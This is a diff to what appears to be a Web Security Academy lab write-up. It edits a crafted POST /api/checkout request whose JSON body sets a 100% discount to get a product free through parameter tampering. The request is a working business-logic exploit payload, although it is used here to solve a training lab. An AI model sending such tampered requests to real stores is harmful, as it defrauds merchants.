@@ -60,24 +60,15 @@ Content-Length: 153
 Here is the custom `POST /api/checkout` request
 ```http
 POST /api/checkout HTTP/2
-Host: 0afa00be0361459380926d9b009b0096.web-security-academy.net
-Cookie: session=EWhGuZzEo1xsMTNf4z8SpLQFV9JtnMKw
-Referer: https://0afa00be0361459380926d9b009b0096.web-security-academy.net/cart
-Content-Length: 157
-Content-Type: application/json
+Host: 0a3b0082035c62d780a7c1a100420056.web-security-academy.net
+Cookie: session=io2WJLKK9Rva0E8TtRHtWk7y0FpYzSnb
+Referer: https://0a3b0082035c62d780a7c1a100420056.web-security-academy.net/cart
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 155
 
-{
-  "chosen_discount":{
-    "percentage": 100
-  },
- 
-  "chosen_products": [
-    { 
-      "product_id": "1",
-      "quantity": 1
-    }
-  ]
-} 
+{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}
 ```
 
 After sending this through, the price should now be successfully updated, and the lab solved
